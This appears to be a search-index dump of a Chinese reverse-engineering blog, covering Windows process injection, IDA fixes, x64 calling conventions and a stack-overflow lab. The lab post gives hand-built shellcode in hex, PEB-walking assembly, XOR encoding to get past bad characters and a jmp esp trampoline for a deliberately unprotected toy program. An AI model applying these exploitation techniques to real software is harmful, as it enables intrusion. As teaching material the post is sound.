(_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWriteVirtualMemory\"); if (pNtWriteVirtualMemory == NULL) { perror(\"[-] Couldn't find API NtWriteVirtualMemory\\n\"); exit(-1); } _NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"N","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:13:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"参考链接 https://bbs.pediy.com/thread-271554.htm https://www.cnblogs.com/LittleHann/p/6336950.html 高级进程注入总结.mhtml Windows进程注入技术研究.mhtml ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:14:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["那些年遇过的坑"],"content":"Python之FileNotFoundError ","date":"2022-03-23","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/:0:0","tags":["Python"],"title":"Python之FileNotFoundError","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/"},{"categories":["那些年遇过的坑"],"content":"现象 Python在Windows上处理长路径时,会出现下列错误. ","date":"2022-03-23","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/:1:0","tags":["Python"],"title":"Python之FileNotFoundError","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/"},{"categories":["那些年遇过的坑"],"content":"解决方案 将HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem中的LongPathsEnabled值修改为1. ","date":"2022-03-23","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/:2:0","tags":["Python"],"title":"Python之FileNotFoundError","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/"},{"categories":["那些年遇过的坑"],"content":"参考链接 https://www.pythonheidong.com/blog/article/442448/f0ee0a3f9fb92350caec/ Python之FileNotFoundError参考.mhtml ","date":"2022-03-23","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/:3:0","tags":["Python"],"title":"Python之FileNotFoundError","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/"},{"categories":["漏洞相关"],"content":"栈溢出原理与实践 ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:0:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"栈结构 寄存器环境 局部变量 调用方栈 返回地址 参数 ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:1:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"实验环境 编译器 VS2022 编译选项 1、属性-\u003eC/C++-\u003e常规-\u003eSDL检查(否 (/sdl-)). 2、属性-\u003eC/C++-\u003e代码生成-\u003e安全检查(禁用安全检查 (/GS-)). 3、属性-\u003e链接器-\u003e高级-\u003e随机基址(否 (/DYNAMICBASE:NO)) 4、属性-\u003e链接器-\u003e高级-\u003e数据执行保护(DEP)(否 (/NXCOMPAT:NO)) build版本 x86 Release ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:2:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"实验例子 #include \u003cstdio.h\u003e#include \u003cwindows.H\u003eint main(int argc, char* argv[]) { char szBuf[8]; FILE* fp = NULL; fp = fopen(\"pwd.txt\", \"r+\"); fscanf(fp, \"%s\", szBuf); if (strcmp(szBuf, \"Hello\") == 0) { printf(\"ok\\r\\n\"); } else { printf(\"error\\r\\n\"); } fclose(fp); return 0; } ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:3:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"漏洞利用 上述代码中fscanf没有长度检查,所以会造成栈溢出,可以被我们利用. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"修改函数返回地址 我们在x64Dbg中定位到fscanf函数. 现在我们想让Main函数执行完后,在返回地址的下个单元即0x19FF34这个地方执行我们的代码,我们需要构造下fscanf读的文件内容. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:1","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"执行我们自己的代码 现在我们来让这个程序弹个MessageBox. 改善环境,增大我们写代码的空间. 72 00 6C 6C 6F 00 00 00 74 FF 19 00 34 FF 19 00 8B DC 81 EC 00 02 00 00 8D 43 F0 50 50 B8 A0 7B E2 76 FF D0 8D 5C 24 08 53 68 1C 21 40 00 50 B8 50 10 40 00 FF D0 FF E3 我们在r文件中填写内容. 上面开辟的空间就是r文件的大小,0x200字节. 弹MessageBox的话,我们通过GetProcAddr(hUser32,“MessageBoxA”)拿函数地址,但hUser32需要通过LoadLibraryA(“user32.dll”)得到.又LoadLibraryA这个函数需要通过GetProcAddr(hKernel32,“LoadLibraryA”)拿函数地址,但hKernel32需要通过LoadLibraryA(“kernel32.dll”)得到,这就陷入了一个循环.但我们可以通过teb结构得到Kernel32的句柄. GetKernelBase proc assume fs : nothing mov eax, fs:[18h] mov eax, [eax + 30h] ;指向PEB结构 mov eax, [eax + 0ch] ;指向LDR Ptr32 _PEB_LDR_DATA mov eax, [eax + 0ch] ;指向InLoadOrderModuleList _LIST_ENTRY mov eax, [eax] ;移动_LIST_ENTRY mov eax, [eax] ;指向Kernel32 mov eax, [eax + 18h] ;指向DllBase ret GetKernelBase endp 在r文件中准备函数和字符串. 558BEC5653578B750803763C8D76788B360375088B450C250000FFFF0BC075168B450C2B46103B4614766D33C05F5B5EC9C20800EB628B450C8B5E20035D0833C9EB388B3C8B037D085157568BF7B000B9FFFFFFFFF2AEF7D18BFE8B750CF3A68A46FF3A47FF750433C0EB051BC0D1E0405E5F590BC07502EB06413B4E1872C33B4E18720933C05F5B5EC9C208008B5E24035D080FB7044B8B5E1C035D088B04830BC0750933C05F5B5EC9C208000345085F5B5EC9C2080064A1180000008B40308B400C8B400C8B008B008B4018C3904C6F61644C69627261727941004D657373616765426F78410048656C6C6F576F726C6421007573657233322E646C6C00 但是这里有个问题,fscanf遇到特定字符就会截断,如0d,0a,0c,0b,20这样的内容,我们需要做个工具,对这些内容进行加密,加密后不允许出现上述字符,如异或加密,我们需要找个一个异或值,使其我们的内容异或后没有敏感字符. 获取异或值. 异或加密. 用Winhex将r文件中的函数和字符串用此异或值进行加密. 开始写代码. 注意:我们写的代码二进制中不能有敏感字符. 8D B3 00 01 00 00 B9 00 01 00 00 80 74 31 FF 85 E2 F9 8D 83 B8 01 00 00 FF D0 8D 8B D0 01 00 00 51 50 8D 83 00 01 00 00 FF D0 8D 8B F5 01 00 00 51 FF D0 8D 8B DD 01 00 00 51 50 8D 83 00 01 00 00 FF D0 6A 00 8D 8B F5 01 00 00 51 8D 8B E9 01 00 00 51 6A 00 FF D0 E8 A0 88 A6 76 将上述二进制数据存到r文件开始即可. 成果展示. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:2","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"注意 如果换个电脑环境,上述程序就运行不起来了,因为我们写了绝对地址. 其中调用方栈位置的数据我们可以随便填,返回地址的地方我们可以找一个跳板地址,里面指令是FFE4(jmp esp),或者是其他的如jmp eax等,这样的话,我们就可以缓解环境问题. 通用跳板:0x7FFA4512(里面指令是FFE4(jmp esp),Win2000,Xp,Win10均可使用. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:3","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"资料下载 栈溢出相关资料.7z ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:5:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["IDA"],"content":"IDA常见错误 ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:0:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"JUMPOUT(xxxx) ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"样本 修复我1.exe ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:1","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"原因 Jmp到一个未知值的时候,IDA就会出现这种错误. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:2","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复 将上图内红框中的汇编,nop掉即可. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:3","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复调用约定 ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"样本 修复我2.exe ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:1","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"原因 从上图发现,v3的值来自edx. 从上图可以看到,edx是sub_401020函数的返回值. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:2","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复 指明函数的返回值是edx. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:3","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"sp-analysis failed ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:0","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"样本 修复我3.exe ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:1","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"原因 这种情况通常是由Call造成的. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:2","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["IDA"],"content":"修复 loc_xxxx是指一段未知的指令集. sub_xxxx是指函数. 将上述Call指令修改为JMP. 最后在ret的地方,设置为函数尾. ","date":"2022-02-15","objectID":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:3","tags":["IDA"],"title":"IDA常见错误","uri":"/posts/ida/ida%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Win相关"],"content":"x64逆向 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:0:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"寄存器 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:1:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数调用约定 四寄存器fast-call调用约定,调用方平栈,一般是函数开头申请栈空间,函数结尾平栈. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:2:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"整型参数 前4个参数传入指定的寄存器RCX, RDX, R8, R9,其余参数传递到堆栈. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:2:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"浮点参数 前4个参数将传入XMM0到XMM3的寄存器,其余参数传递到堆栈. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:2:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"栈空间 会有0x20字节的预留空间,一般用来存放4个寄存器RCX,RDX,R8,R9中的值. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:3:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"汇编版HelloWorld #hello.asm includelib user32.lib includelib kernel32.lib extrn MessageBoxA:proc extrn ExitProcess:proc NULL EQU 0 MB_OK EQU 0 .const MSG1 db \"Hello World!\", 0 TITLE1 db \"Luo\", 0 .code START proc ;栈地址必须保证模16, 申请栈空间保证模8 ;栈预留空间32（20h)个字节 sub rsp, 28h mov rcx, NULL mov rdx, offset MSG1 mov r8, offset TITLE1 mov r9d, MB_OK call MessageBoxA mov ecx, 0 call ExitProcess add rsp, 28h RET START endp end ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:4:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"编译 ml64 /c hello.asm link /subsystem:windows /entry:START hello.obj ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:4:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"注意 栈地址必须模16, 因为你函数内调用API时,API内会用到多媒体指令,极大可能会使用movaps这个指令,这个指令要求栈地址必须模16,否则程序会崩. 故申请的栈空间大小要求模8. 其实在系统断点处,栈地址是模16的,但由于经过了CAll指令才到达入口断点, 此时栈会抬高8字节,变成模8. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:4:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"定位入口函数 Main函数走完,会退进程,调用exit,故离exit最近的一个三参数函数就是Main函数. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:5:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"iob数组 #define stdin (__acrt_iob_func(0)) #define stdout (__acrt_iob_func(1)) #define stderr (__acrt_iob_func(2)) ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:6:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"iob参数 为1的话,可以命名该函数为printf. 为0的话,可以命名该函数为scanf. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:6:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"传参 参数是结构体大小为8字节 struct tagPoint { int x1; int y1; }; void fun(tagPoint pt) { printf(\"x=%d y=%d\\r\\n\", pt.x1, pt.y1); } int main(int argc, char* argv[]) { tagPoint pt = { 1, 2 }; fun(pt); system(\"pause\"); return 0; } Debug 特征 直接使用RCX传参,函数内拆开. 参数是结构体大小超过8字节 struct tagPoint{ int x1; int y1; int x2; int y2; }; void fun(tagPoint pt) { printf(\"x1=%d y1=%d x2=%d y2=%d\\r\\n\", pt.x1, pt.y1, pt.x2, pt.y2); } int main(int argc, char* argv[]) { tagPoint pt = { 1, 2, 3, 4 }; fun(pt); system(\"pause\"); return 0; } Debug 特征 会出现栈拷贝. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"返回值 如果返回类型为int或long long, 则放在RAX. 如果返回类型为float或double,则放在xmm0. 返回结构体大小为8字节 放在RAX中. 返回结构体大小超过8字节 struct tagPoint{ int x1; int y1; int x2; int y2; }; tagPoint fun() { tagPoint pt = { 1, 2, 3, 4 }; return pt; } int main(int argc, char* argv[]) { tagPoint pt = fun(); system(\"pause\"); return 0; } Debug 特征 函数多了一个参数. 函数内返回时,以参数为目标做memcpy,并返回参数1. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"注意 对低32位寄存器赋值,高32位自动清零.也就是说,如当我们看到函数传参,mov ecx, 2 不能说明参数为4字节,要看函数内使用的是RCX还是ECX. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:7:3","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"变量相关 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:8:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"局部变量 int main(int argc, char* argv[]) { int nNum1 = 1; int nNum2 = 2; printf(\"%d\\r\\n\", nNum1 + nNum2); system(\"pause\"); return 0; } Debug 特征 先定义的在低地址,后定义的在高地址,且不相邻. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:8:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"全局变量 int g_nNum1 = 1; int g_nNum2 = 2; int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", g_nNum1 + g_nNum2); system(\"pause\"); return 0; } Debug 特征 地址在全局数据区. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:8:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"数组 int main(int argc, char* argv[]) { int ary[] = { 1, 2, 3, 4, 5, 6, 7, 8}; printf(\"%d %d\\r\\n\", ary[2], ary[argc]); system(\"pause\"); return 0; } ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:9:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"Debug ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:9:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"Release ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:9:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"特征 一维数组寻址公式: 数组元素的地址 = 数组首地址 + sizeof(数组类型) x 下标 二维数组寻址公式: 数组元素的地址 = 数组首地址 + sizeof(一维数组类型) x 下标1 + sizeof(数组类型) x 下标2 Debug版和Release版的寻址公式,同32位. 不同的是64位Release版,数组初始化使用多媒体指令. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:9:3","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"流程控制语句 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"IF 单分支 int main(int argc, char* argv[]) { if (argc \u003e 1) { printf(\"argc \u003e 1\\r\\n\"); } system(\"pause\"); return 0; } Release 特征识别 图形识别 虚线:条件跳转. 实线:无条件跳转. 每一个点代表一行汇编代码. if语句中有一个jxx跳转,因此会有一个向下的虚线箭头. 看到上图中标红区域的图形,即可判断其为if语句. 双分支 int main(int argc, char* argv[]) { if (argc == 1) { printf(\"argc == 1\\r\\n\"); } else { printf(\"argc != 1\\r\\n\"); } system(\"pause\"); return 0; } Debug 特征识别 图形识别 因为if语句中有一个jxx指令用于向下跳转,所以会有一个向下的虚线箭头. 又因为else语句中有jmp跳转,所以虚线箭头中会有一个向下的实线箭头. 看到上图中标红区域的图形,即可判断为if...else语句, 虚线箭头之间的代码为if代码,实线箭头之间的代码为else代码. 多分支 int main(int argc, char* argv[]) { if (argc \u003e 2) { printf(\"argc \u003e 2\\r\\n\"); } else if(argc == 2) { printf(\"argc == 2\\r\\n\"); } else { printf(\"argc \u003c 2\\r\\n\"); } system(\"pause\"); return 0; } Debug 特征识别 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"SwitchCase 同32位. 